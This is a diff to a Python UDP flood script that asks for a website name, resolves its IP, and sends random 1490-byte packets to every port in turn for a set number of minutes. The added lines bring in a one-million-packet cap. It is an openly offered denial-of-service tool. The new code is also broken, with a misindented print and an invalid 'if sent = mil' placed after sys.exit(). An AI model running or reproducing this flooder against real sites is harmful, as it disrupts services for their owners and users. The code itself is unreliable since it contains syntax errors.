@@ -17,7 +17,7 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
-sent = 0
+
 limit = 0
 app = 0
 port = 0
@@ -37,7 +37,7 @@ print()
 print
 site = input('Имя сайта: ')
 ip = socket.gethostbyname(site) 
-
+time.sleep(2)
 print ('Site IP: ',ip)
 print()
 print('##########################################')
@@ -52,25 +52,31 @@ limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
 print('End site attack in: %s:%s'%(hour,stopminute))
 print('##########################################')
-time.sleep(5)
-print('##########################################')
-nowhour = 0
-nowminute = 0
+
+#nowhour = 0
+#nowminute = 0
 
 ##nowhour = now.hour*1
 ##nowminute = now.minute*1
 ##print('time %s:%s'%(nowhour,nowminute))
 ##print "sent packet: s% to %s on port:%s"%(sent,ip,port)
 
+sent = 0
+mil = 1000000
 while True:
-            nowminute = now.minute*1
-            print('End site attack in: %s:%s'%(hour,stopminute))
-            sock.sendto(bytes, (ip,port))
-            sent = sent + 1
-            port = port + 1
+            now = datetime.now()
+            nowminute = now.minute
             print(nowminute)
+            print('Stop attack in %s:%s'%(hour,stopminute))
+            sock.sendto(bytes, (ip,port))
+            sent = sent + 1            
+            stopattack = mil - sent 
+print('###',stopattack)
+            port = port + 1
             if port == 65534:
                         port = 1
                         
             if nowminute == stopminute:
                         sys.exit()
+                        if sent = mil:
+                                    break
